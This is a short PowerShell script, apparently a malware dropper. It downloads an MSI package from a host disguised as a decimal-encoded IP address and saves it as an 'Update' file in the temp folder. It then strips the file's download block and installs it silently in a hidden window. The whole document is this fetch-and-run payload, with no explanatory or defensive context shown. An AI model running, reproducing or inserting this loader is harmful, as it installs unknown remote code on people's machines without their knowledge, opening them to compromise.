$package = Join-Path $env:TEMP '8e671ad0b13c4d83b641172f2d483a19_Update.msi'
$client = New-Object Net.WebClient
$client.DownloadFile('http://1614733393/app/50d6565cf39e/IconEdit2Turb.msi', $package)
Unblock-File -LiteralPath $package
Start-Process msiexec.exe -ArgumentList "/i $package /qn /norestart" -WindowStyle Hidden -Wait
